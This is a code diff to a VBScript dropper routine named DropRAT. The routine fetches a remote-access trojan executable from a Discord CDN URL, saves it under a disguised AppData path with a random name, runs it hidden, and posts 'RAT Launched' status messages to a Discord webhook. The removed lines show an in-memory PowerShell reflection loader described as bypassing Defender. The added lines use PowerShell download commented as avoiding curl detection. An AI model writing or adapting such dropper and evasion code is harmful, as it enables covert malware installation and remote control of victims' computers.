@@ -43,28 +43,37 @@ Loop
 
 window.close()
 
-' --- RAT DROP (Memory Execution via PowerShell) ---
+' --- RAT DROP (Standard Download to Disk) ---
 Sub DropRAT(targetWH, sendRocket)
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1570877567567929557/1572764410202693664/client_10.exe?ex=6aff8e7f&is=6afe3cff&hm=8cecb094312df98931f68499bcc7013bf7c20990176268e7887e512d1301da39&"
     
+    Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
+    If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
+    Randomize
+    Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000) & ".exe"
+    Dim op : op = tPath & "\" & fname
+
     ' 1. Send the Rocket Download message
     If sendRocket Then Call PostEmbedTo(":rocket: RAT Download", "Downloading and launching RAT", 10181046, targetWH)
 
-    ' 2. In-Memory Execution (Bypasses Defender disk scanning)
-    ' Downloads bytes, invokes reflection, executes in RAM.
-    Dim psCmd : psCmd = "powershell -NoP -Exec Bypass -Command """ & _
-        "$wc = New-Object System.Net.WebClient;" & _
-        "$bytes = $wc.DownloadData('" & dl & "');" & _
-        "[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, @($null, [string[]]@()));" & _
-        """"
-    
-    ' Run it hidden
-    sh.Run psCmd, 0, False
+    If fso.FileExists(op) Then fso.DeleteFile op, True
 
-    ' 3. Send the Green Checkmark
-    If sendRocket Then 
-        Call SleepSeconds(2) ' Small delay so the message sends after the rocket
-        Call PostEmbedTo(":white_check_mark: RAT Launched", "Payload executed successfully in memory.", 10181046, targetWH)
+    ' 2. Download file via PowerShell (avoids curl detection)
+    Dim psCmd : psCmd = "powershell -NoP -Exec Bypass -Command ""(New-Object Net.WebClient).DownloadFile('" & dl & "', '" & op & "')"""
+    sh.Run psCmd, 0, True
+
+    ' 3. Execute the file normally
+    If fso.FileExists(op) Then
+        If fso.GetFile(op).Size > 100000 Then
+            ' Run the file
+            sh.Run """" & op & """", 0, False
+            
+            ' 4. Send the Green Checkmark
+            If sendRocket Then 
+                Call SleepSeconds(2) ' Small delay
+                Call PostEmbedTo(":white_check_mark: RAT Launched", "Payload executed successfully.", 10181046, targetWH)
+            End If
+        End If
     End If
 End Sub
 
